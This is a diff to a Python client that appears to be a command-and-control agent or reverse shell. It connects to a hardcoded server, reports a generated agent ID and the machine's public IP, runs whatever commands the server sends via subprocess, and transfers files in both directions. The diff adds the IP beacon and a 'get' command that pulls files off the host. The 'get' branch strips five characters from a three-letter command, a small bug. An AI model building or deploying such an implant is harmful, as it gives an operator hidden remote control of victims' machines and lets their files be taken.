@@ -2,10 +2,29 @@ import socket
 import subprocess
 import os
 import uuid
+import requests
+
+from FileTransfer import receive_file_from_server, receive_file_from_client
+
 
 def get_agent_id():
     # Generate a unique agent ID based on machine and network information
     return str(uuid.uuid1())
+
+
+def get_public_ip():
+    try:
+        # Use a public service to fetch the IP address
+        response = requests.get('https://api.ipify.org?format=json')
+        if response.status_code == 200:
+            public_ip = response.json()['ip']
+            return public_ip
+        else:
+            print("Failed to retrieve public IP")
+            return None
+    except Exception as e:
+        print(f"Error: {e}")
+        return None
 
 
 def execute_command(command):
@@ -27,54 +46,22 @@ def execute_command(command):
         return str(e)
 
 
-def receive_file_from_server(client_socket, file_path):
-    save_directory = r"C:\Users\User\Downloads"  # Specify the directory where you want to save the file
-    os.makedirs(save_directory, exist_ok=True)
-
-    try:
-        file_name = os.path.basename(file_path.strip())
-        abs_file_path = os.path.abspath(os.path.join(save_directory, file_name))
-        print(f"Saving file to: {abs_file_path}")
-
-        with open(abs_file_path, "wb") as file:
-            while True:
-                data = client_socket.recv(4096)
-                if not data:
-                    break
-                print(f"Received data length: {len(data)}")
-                file.write(data)
-
-        print(f"File saved successfully at: {abs_file_path}")
-        client_socket.send("File received successfully".encode('utf-8'))
-
-        # Ensure the file is closed before returning
-        file.close()
-
-        with open(abs_file_path, "rb") as file:
-            file_content = file.read()
-            print(f"Content of saved file length: {len(file_content)}")
-
-        # Add a return statement to break out of the file processing loop
-        return True
-
-    except OSError as e:
-        print(f"OS Error ({e.errno}): {e.strerror}")
-    except Exception as e:
-        print(f"Error while receiving file: {e}")
-
-    # Return False if there was an issue with file processing
-    return False
-
-
 def main():
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client.connect(('192.168.60.146', 1234))  # Enter the server's IP address here
+    client.connect(('192.168.68.107', 1234))  # Replace 'server_ip' with the actual server IP address
 
-    # Send Agent ID to the server
+    # Get the public IP address
+    public_ip = get_public_ip()
+
+    # Send Agent ID and public IP address to the server
     agent_id = get_agent_id()
     client.send(agent_id.encode('utf-8'))
+    client.send(public_ip.encode('utf-8'))
 
     while True:
+        # Receive selected_agent from the server
+        selected_agent = client.recv(4096).decode('utf-8')
+
         command = client.recv(4096).decode('utf-8')
         if command.lower() == 'exit':
             break
@@ -82,6 +69,10 @@ def main():
             file_path = command[5:].strip().replace("`", "")
             receive_file_from_server(client, file_path)
             # Send acknowledgment to the server that file upload is complete
+            client.send("File upload complete".encode('utf-8'))
+        elif command.startswith("get"):
+            file_path = command[5:].strip().replace("`", "")
+            receive_file_from_client(client, file_path)
             client.send("File upload complete".encode('utf-8'))
         else:
             output = execute_command(command)
